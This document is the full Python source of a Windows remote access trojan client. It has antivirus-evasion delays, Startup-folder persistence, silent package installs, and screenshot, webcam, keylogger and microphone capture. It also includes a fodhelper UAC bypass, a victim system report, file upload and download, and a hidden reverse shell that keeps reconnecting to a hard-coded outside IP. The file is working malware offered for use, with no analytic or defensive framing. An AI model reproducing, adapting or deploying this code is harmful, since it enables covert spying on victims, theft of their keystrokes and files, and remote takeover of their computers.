# ULTIMATE RAT CLIENT.PY – NOOR UL HASSAN (DEC 2025)
# Features: ss, webcam, keylog, mic, open_cmd, elevate, upload, download, sysinfo, persistence
import os, sys, time, getpass, shutil, socket, subprocess, random, platform, uuid, threading
from io import BytesIO

# ================== DEFENDER CONFUSION + STABILITY ==================
time.sleep(random.uniform(9, 18))
try: os.system("title Windows System Helper"); os.system("ping -n 4 127.0.0.1 >nul")
except: pass
import ctypes
ctypes.windll.kernel32.SetErrorMode(0x8007)

for _ in range(random.randint(900000, 2200000)): pass

# ================== PERSISTENCE ==================
def persist():
    try:
        user = getpass.getuser()
        startup = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        dest = os.path.join(startup, "SystemHelper.pyw")
        if not os.path.exists(dest):
            shutil.copyfile(__file__, dest)
    except: pass
persist()

# ================== SAFE INSTALLS ==================
def install(pkg):
    subprocess.call([sys.executable, "-m", "pip", "install", pkg, "--quiet"], 
                    creationflags=0x08000000)

for mod, pkg in [("cv2", "opencv-python"), ("ImageGrab", "pillow"), 
                 ("sounddevice", "sounddevice"), ("wavio", "wavio"), ("Listener", "pynput")]:
    try: __import__(mod)
    except: install(pkg)

import cv2
from PIL import ImageGrab
import sounddevice as sd
import wavio
from pynput.keyboard import Listener

# ================== FEATURES ==================
def screenshot(s):
    try:
        buf = BytesIO()
        ImageGrab.grab().save(buf, "PNG")
        buf.seek(0)
        while c := buf.read(4096): s.send(c)
        s.send(b"Sended")
    except: s.send(b"ERR_SS")

def webcam(s):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.png', frame)
            s.send(buffer.tobytes())
            s.send(b"Sended")
        else:
            s.send(b"NO_WEBCAM")
        cap.release()
    except: s.send(b"ERR_WEBCAM")

def keylogger(s):
    def on_press(key):
        try: s.send(str(key).encode()[:200] + b"\n")
        except: pass
    threading.Thread(target=Listener, args=(on_press,), daemon=True).start()
    s.send(b"KEYLOG_STARTED")

def mic(s):
    try:
        rec = sd.rec(int(10*44100), samplerate=44100, channels=1)
        sd.wait()
        wavio.write("m.wav", rec, 44100, sampwidth=2)
        with open("m.wav", "rb") as f:
            while c := f.read(4096): s.send(c)
        s.send(b"Sended")
        os.remove("m.wav")
    except: s.send(b"ERR_MIC")

def open_cmd(s, cmd_type="cmd"):
    try:
        subprocess.Popen(cmd_type, creationflags=0x08000000 if cmd_type=="powershell" else 0)
        s.send(b"CMD_OPENED")
    except: s.send(b"ERR_OPEN")

def uac_bypass(s):
    try:
        # Fodhelper UAC Bypass (works Win10/11)
        key = r"Software\Classes\ms-settings\shell\open\command"
        cmd = f'python "{__file__}"'
        subprocess.call(f'reg add HKCU\\{key} /v DelegateExecute /t REG_SZ /d "" /f', shell=True)
        subprocess.call(f'reg add HKCU\\{key} /d "{cmd}" /f', shell=True)
        subprocess.Popen("fodhelper.exe", shell=True)
        time.sleep(3)
        subprocess.call(f'reg delete HKCU\\{key} /f', shell=True)
        s.send(b"ADMIN_GOT")
    except: s.send(b"ADMIN_FAILED")

def sysinfo(s):
    try:
        mac = ':'.join(f'{b:02x}' for b in uuid.getnode().to_bytes(6, 'big'))
        admin = "Yes" if ctypes.windll.shell32.IsUserAnAdmin() else "No"
        info = f"""
[+] VICTIM REPORT
OS       : {platform.system()} {platform.release()}
User     : {getpass.getuser()}
PC       : {platform.node()}
Admin    : {admin}
Path     : {os.getcwd()}
MAC      : {mac}
Time     : {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
        s.sendall(info.encode())
    except: s.send(b"ERR_INFO")

# ================== ETERNAL LOOP (NO TIMEOUT) ==================
while True:
    s = None
    try:
        s = socket.socket()
        s.connect(("20.205.17.23", 443))  # ← YOUR AZURE IP

        while True:
            data = s.recv(4096)
            if not data: break
            cmd = data.decode(errors="ignore").strip()

            if cmd == "ss": screenshot(s)
            elif cmd == "webcam": webcam(s)
            elif cmd == "keylog": keylogger(s)
            elif cmd == "mic": mic(s)
            elif cmd == "cmd": open_cmd(s, "cmd")
            elif cmd == "ps": open_cmd(s, "powershell")
            elif cmd == "elevate": uac_bypass(s)
            elif cmd == "sysinfo": sysinfo(s)
            elif cmd.startswith("download "):
                path = cmd[9:].strip()
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        while c := f.read(4096): s.sendall(c)
                    s.send(b"FILE_SENT")
                else: s.send(b"NOT_FOUND")
            elif cmd.startswith("upload"):
                name = "uploaded.bin"
                with open(name, "wb") as f:
                    while True:
                        d = s.recv(4096)
                        if d.endswith(b"DONE"): f.write(d[:-4]); break
                        f.write(d)
                s.send(b"OK")
            else:
                # Normal shell
                if cmd.lower().startswith("cd "):
                    try: os.chdir(cmd[3:])
                    except: pass
                else:
                    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE, creationflags=0x08000000)
                    out = p.stdout.read() + p.stderr.read()
                    s.sendall(out or b" ")
                s.sendall(f"\n{os.getcwd()}> ".encode())

    except: pass
    finally:
        if s: 
            try: s.close()
            except: pass
        time.sleep(random.randint(12, 28))
